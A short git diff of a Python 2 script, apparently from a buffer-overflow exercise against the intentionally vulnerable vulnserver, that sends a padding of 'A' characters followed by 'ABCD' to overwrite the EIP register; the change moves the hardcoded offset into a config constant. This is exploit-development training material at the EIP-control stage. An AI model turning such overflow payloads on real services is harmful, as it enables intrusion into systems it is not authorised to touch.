@@ -1,9 +1,13 @@
 #!/usr/bin/env python2
 
-import socket
-from options import HOST, PORT
+"""
+Sends example shellcode as 'ABCD' to see if that sequence is injected anywhere.
+"""
 
-shellcode = ('A' * 2003)  # 2003 because pattern_offset.rb with 3200 length found 386F4337 as a val at position 2003
+import socket
+from options import HOST, PORT, SHELLCODE_OFFSET
+
+shellcode = ('A' * SHELLCODE_OFFSET)
 shellcode += 'ABCD'  # this should fill the EIP register in vulnserver with 'ABCD' character aka 41 42 43 44
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
